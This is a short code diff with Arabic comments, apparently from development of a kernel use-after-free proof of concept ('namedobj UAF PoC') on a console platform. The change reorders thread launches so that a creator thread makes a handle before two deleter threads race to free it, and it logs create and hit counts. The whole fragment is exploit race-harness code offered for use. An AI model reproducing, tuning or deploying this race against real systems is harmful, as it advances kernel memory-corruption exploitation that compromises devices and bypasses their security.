@@ -70,18 +70,25 @@ int _main(struct thread *td) {
 
     printf_debug("=== namedobj UAF PoC ===\n");
 
-    scePthreadCreate(&tC, NULL, thread_create,   NULL, "creator");
+    // [1] شغّل creator أولاً
+    scePthreadCreate(&tC, NULL, thread_create, NULL, "creator");
+
+    // [2] انتظر حتى ينشئ أول handle
+    printf_debug("waiting for first create...\n");
+    while (g_count == 0) {
+        int i = 0;
+        while (i < 10000) i++;  // busy wait قصير
+    }
+    printf_debug("first create done, launching deleters\n");
+
+    // [3] الآن أطلق الـ deleters
     scePthreadCreate(&tA, NULL, thread_delete_a, NULL, "deleter_a");
     scePthreadCreate(&tB, NULL, thread_delete_b, NULL, "deleter_b");
 
-    // انتظار بدون freeze وبدون usleep
     int seconds = 0;
     while (seconds < 30 && g_running) {
         int i = 0;
-        // busy wait لمدة ثانية تقريباً
-        while (i < 100000000 && g_running) {
-            i++;
-        }
+        while (i < 100000000 && g_running) i++;
         seconds++;
         printf_debug("t=%ds creates=%d hits=%d\n",
                      seconds, g_count, g_hits);
